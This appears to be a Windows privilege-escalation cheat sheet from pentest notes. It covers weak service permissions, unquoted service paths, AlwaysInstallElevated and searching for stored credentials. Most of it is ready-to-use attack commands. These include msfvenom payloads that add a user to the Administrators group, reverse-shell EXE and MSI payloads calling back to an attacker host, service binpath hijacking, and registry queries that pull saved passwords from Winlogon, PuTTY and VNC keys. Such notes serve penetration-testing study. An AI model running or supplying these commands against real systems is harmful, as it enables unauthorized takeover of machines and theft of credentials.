# Privilege Escalation

* **Insecure Write Permissions on Folder**
  * Check service with trusted permissions
    * `sc qc <service_name>`
  * Manually check permissions for the service
    * `icacls "C:\Program Files\Demo Service 3\demoservice3.exe"`
  * Generate payload using msfvenom
    * `msfvenom -p windows/exec CMD="net localgroup administrators test /add" -f exe-service -o demo3service.exe`
  * Restart service
    * `net stop demosvc3`&#x20;
    * `net start demosvc3`
  * Test user is added to Admin grp
    * `net user test`
* **Insecure write permission on config file**
  * Check service with trusted permissions
    * `sc qc <service_name>`
  * Check if test user has access to modify service configuration
    * `accesschk.exe /accepteula -uwcqv <current username> <service name>`
  * Generate executable shell and transfer to target
    * `msfvenom -p windows/shell_reverse_tcp LHOST=<Your system IP> LPORT=<Your system port> -f exe > reverse.exe`
  * Use sc command to change the binpath of vulnerable service
    * `sc config demosvc1 binpath="c:\users\test\reverse.exe"`
  * Restart service
    * `net stop demosvc3`&#x20;
    * `net start demosvc3`
  * Check if you get reverse shell
* #### Unquoted Service Path
  * Any service executable whose path contains space and is not enclosed in the quote is vulnerable to this attack. E.g. C:\Program Files\Unquoted Path\uqsp.exe
  * Check manually using sc command
    * `sc qc <service name>`
  *   When **SCM(Service Control Manager)** starts this service, it will look at the following paths in order, and it will run first exe that it will find

      ```
      C:\Program.exe
      C:\Program Files\Unquoted.exe
      C:\Program Files\Unquoted Path\uqsp.exe
      ```
  * Check permission on installed service folder.
    * `accesschk.exe /accepteula -uwdq "C:\Program Files"`
  * If we have write permission in “C” or “Program Files” folder, then we can generate our shellcode with the name (“Program.exe” or “Unquoted.exe”) and add that in the required folders.\
    `msfvenom -p windows/exec CMD="net localgroup administrators test /add" -f exe-service -o Unquoted.exe`\
    ``Place the file “Unquoted.exe” under the “Program Files” folder.
  * Restart service
    * `net stop demosvc3`&#x20;
    * `net start demosvc3`
  * Test user is added to Admin grp
    * `net user test`
* **Always Elevated Install**
  * [AlwaysInstallElevated](https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) setting allows a non-privileged user to run Microsoft Windows Installer Package (msi) with elevated privileges
  * Check registry policy (REG\_DWORD is set to 1)
    * `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`&#x20;
    * `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  *   Generate a reverse shell using msfvenom of file type msi\
      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<You system IP> LPORT=<Your system port> -f msi -o kumar.msi`

      Transfer and run this msi file into the target system\
      It will give nt authority\system level access
* #### Insecure Storage
  * Check if any file contains hardcoded credentials in cleartext
  * [Findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) tool can be used to check for specific strings on the target machine.
    * `findstr /spin "credentials" *.*`
  *   It is also possible that the vendor has kept credentials in registry.

      ```
      reg query HKLM /f password /t REG_SZ /s
      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
      reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
      reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
      reg query "HKCU\Software\ORL\WinVNC3\Password
      ```
